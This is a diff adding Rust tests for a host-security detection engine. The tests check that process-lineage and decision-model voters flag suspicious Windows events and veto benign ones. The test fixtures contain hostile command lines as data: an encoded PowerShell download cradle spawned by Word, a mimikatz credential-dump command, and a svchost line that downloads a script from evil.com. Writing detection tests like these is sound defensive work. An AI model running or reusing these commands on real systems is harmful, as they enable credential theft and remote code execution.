@@ -562,3 +562,222 @@ fn test_adversarial_zk_pii_declassification_tampered_proofs_fail_closed() -> Res
 
     Ok(())
 }
+
+// -----------------------------------------------------------------------------
+// 4. BehavioralProcessLineageVoter Empirical Lineage & Taint Tests
+// -----------------------------------------------------------------------------
+
+#[tokio::test]
+async fn test_behavioral_process_lineage_voter_suspicious_lineage_and_taint() -> Result<()> {
+    use osoosi_agent_anomaly::classifier::DynamicAgentClassifier;
+    use osoosi_behavioral::BehavioralAnalyzer;
+    use osoosi_core::adaptive::TelemetryController;
+    use osoosi_core::causal_graph::{CausalSecurityGraph, ProcessInstanceIdentity};
+    use osoosi_core::voters::BehavioralProcessLineageVoter;
+    use std::sync::Arc;
+
+    let graph = Arc::new(CausalSecurityGraph::in_memory()?);
+    let analyzer = Arc::new(BehavioralAnalyzer::new());
+    let classifier = Arc::new(DynamicAgentClassifier::new());
+    let adaptive = Arc::new(TelemetryController::new());
+
+    let voter = BehavioralProcessLineageVoter::new(
+        analyzer,
+        classifier,
+        graph.clone(),
+        adaptive,
+    );
+
+    assert_eq!(voter.name(), "Behavioral-Process-Lineage");
+
+    // Case 1: Office app spawning PowerShell with suspicious execution
+    let ev_office_shell = HostSecurityEvent {
+        source: HostEventSource::WindowsEventLog,
+        event_id: 1,
+        timestamp: chrono::Utc::now(),
+        computer: "WORKSTATION-01".to_string(),
+        data: json!({
+            "ProcessId": 5012,
+            "ParentProcessId": 4120,
+            "ParentImage": r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
+            "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+            "CommandLine": "powershell.exe -enc aWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQp",
+        }),
+        causal_parent: None,
+    };
+
+    let vote1 = voter.vote(&ev_office_shell).await.expect("Must vote on Office spawning PowerShell");
+    assert_eq!(vote1.weight, 1.85, "Lineage voter must assign 1.85 weight");
+    assert!(vote1.confidence >= 0.70, "Confidence must be >= 0.70, got {}", vote1.confidence);
+    assert!(
+        vote1.reason.contains("Suspicious MITRE execution tree"),
+        "Reason must state suspicious MITRE tree: {}",
+        vote1.reason
+    );
+
+    // Case 2: Process tainted in CausalSecurityGraph
+    let tainted_pid = 7788u32;
+    let proc_path = r"C:\Windows\System32\cmd.exe";
+    let identity = ProcessInstanceIdentity::new(
+        tainted_pid,
+        133000000000000000,
+        "hash_c2_breakout",
+        Some("parent_inst_1".to_string()),
+        None,
+        "session_atk_1",
+    );
+    graph.register_process_instance(&identity, proc_path, 2, false)?;
+
+    let ev_tainted_proc = HostSecurityEvent {
+        source: HostEventSource::WindowsEventLog,
+        event_id: 1,
+        timestamp: chrono::Utc::now(),
+        computer: "WORKSTATION-01".to_string(),
+        data: json!({
+            "ProcessId": tainted_pid,
+            "ParentProcessId": 1000,
+            "ParentImage": r"C:\Windows\explorer.exe",
+            "Image": proc_path,
+            "CommandLine": "cmd.exe /c echo breakout",
+        }),
+        causal_parent: None,
+    };
+
+    let vote2 = voter.vote(&ev_tainted_proc).await.expect("Must vote on tainted process");
+    assert_eq!(vote2.weight, 1.85);
+    assert!(vote2.confidence >= 0.70);
+    assert!(
+        vote2.reason.contains("tainted in CausalSecurityGraph"),
+        "Reason must cite CausalSecurityGraph taint: {}",
+        vote2.reason
+    );
+
+    // Case 3: Benign event without suspicious lineage or taint
+    let ev_benign = HostSecurityEvent {
+        source: HostEventSource::WindowsEventLog,
+        event_id: 1,
+        timestamp: chrono::Utc::now(),
+        computer: "WORKSTATION-01".to_string(),
+        data: json!({
+            "ProcessId": 9123,
+            "ParentProcessId": 1000,
+            "ParentImage": r"C:\Windows\explorer.exe",
+            "Image": r"C:\Windows\System32\notepad.exe",
+            "CommandLine": "notepad.exe meeting_notes.txt",
+        }),
+        causal_parent: None,
+    };
+
+    let vote3 = voter.vote(&ev_benign).await;
+    assert!(vote3.is_none(), "Benign notepad execution must not trigger lineage vote");
+
+    Ok(())
+}
+
+// -----------------------------------------------------------------------------
+// 5. ClefDecisionVoter Empirical Malicious & Certified Benign Veto Tests
+// -----------------------------------------------------------------------------
+
+#[tokio::test]
+async fn test_clef_decision_voter_malicious_and_benign_veto() -> Result<()> {
+    use osoosi_behavioral::decision_model::ClefDecisionEngine;
+    use osoosi_types::DecisionModelConfig;
+    use osoosi_core::adaptive::TelemetryController;
+    use osoosi_core::voters::ClefDecisionVoter;
+    use std::sync::Arc;
+
+    let temp_model_dir = std::env::temp_dir().join(format!("clef_test_{}", uuid::Uuid::new_v4()));
+    std::fs::create_dir_all(&temp_model_dir).ok();
+
+    let mut cfg = DecisionModelConfig::default();
+    cfg.enabled = true;
+    cfg.provider = "local".to_string();
+    cfg.model_dir = temp_model_dir.to_str().unwrap().to_string();
+
+    let engine = Arc::new(ClefDecisionEngine::new(cfg));
+    let adaptive = Arc::new(TelemetryController::new());
+    let voter = ClefDecisionVoter::new(engine, adaptive);
+
+    assert_eq!(voter.name(), "Clef-Decision-Model");
+
+    // Case 1: Known malicious mimikatz logonpasswords attack
+    let ev_malicious = HostSecurityEvent {
+        source: HostEventSource::WindowsEventLog,
+        event_id: 1,
+        timestamp: chrono::Utc::now(),
+        computer: "CORP-HOST".to_string(),
+        data: json!({
+            "Image": r"C:\Users\Public\mimikatz.exe",
+            "ParentImage": r"C:\Windows\System32\cmd.exe",
+            "CommandLine": "sekurlsa::logonpasswords",
+            "Signed": false,
+        }),
+        causal_parent: None,
+    };
+
+    let vote1 = voter.vote(&ev_malicious).await.expect("Clef must vote on mimikatz attack");
+    assert_eq!(vote1.weight, 1.85, "Malicious Clef verdict must have 1.85 weight");
+    assert!(vote1.confidence >= 0.70, "Confidence must be >= 0.70, got {}", vote1.confidence);
+    assert!(
+        vote1.reason.contains("Clef-Decision-Model: malicious") || vote1.reason.contains("Clef-Decision-Model"),
+        "Reason must state Clef-Decision-Model verdict: {}",
+        vote1.reason
+    );
+
+    // Case 2: Certified benign svchost.exe DcomLaunch
+    let ev_benign = HostSecurityEvent {
+        source: HostEventSource::WindowsEventLog,
+        event_id: 1,
+        timestamp: chrono::Utc::now(),
+        computer: "CORP-HOST".to_string(),
+        data: json!({
+            "Image": r"C:\Windows\System32\svchost.exe",
+            "ParentImage": r"C:\Windows\System32\services.exe",
+            "CommandLine": "svchost.exe -k DcomLaunch",
+            "Signed": true,
+            "SignatureStatus": "Valid",
+            "Company": "Microsoft Corporation",
+            "Invariants": "Nominal",
+        }),
+        causal_parent: None,
+    };
+
+    let vote2 = voter.vote(&ev_benign).await.expect("Clef must evaluate benign svchost");
+    assert_eq!(vote2.weight, -1.25, "Benign Clef verdict must cast certified benign veto (-1.25)");
+    assert!(
+        vote2.reason.contains("Benign Veto"),
+        "Reason must state Benign Veto: {}",
+        vote2.reason
+    );
+
+    // Case 3: Benign-looking image with active LOTL indicator suppresses benign veto
+    let ev_lotl_abuse = HostSecurityEvent {
+        source: HostEventSource::WindowsEventLog,
+        event_id: 1,
+        timestamp: chrono::Utc::now(),
+        computer: "CORP-HOST".to_string(),
+        data: json!({
+            "Image": r"C:\Windows\System32\svchost.exe",
+            "ParentImage": r"C:\Windows\System32\services.exe",
+            "CommandLine": "svchost.exe -k DcomLaunch /downloadstring:http://evil.com/hook.ps1",
+            "Signed": true,
+            "SignatureStatus": "Valid",
+            "Company": "Microsoft Corporation",
+        }),
+        causal_parent: None,
+    };
+
+    let vote3 = voter.vote(&ev_lotl_abuse).await;
+    // Because downloadstring is an active LOTL marker, benign veto is suppressed!
+    if let Some(ref v) = vote3 {
+        assert!(
+            v.weight > 0.0,
+            "Active LOTL marker must NEVER be vetoed with negative weight: {:?}",
+            v
+        );
+    }
+
+    let _ = std::fs::remove_dir_all(&temp_model_dir);
+    Ok(())
+}
+
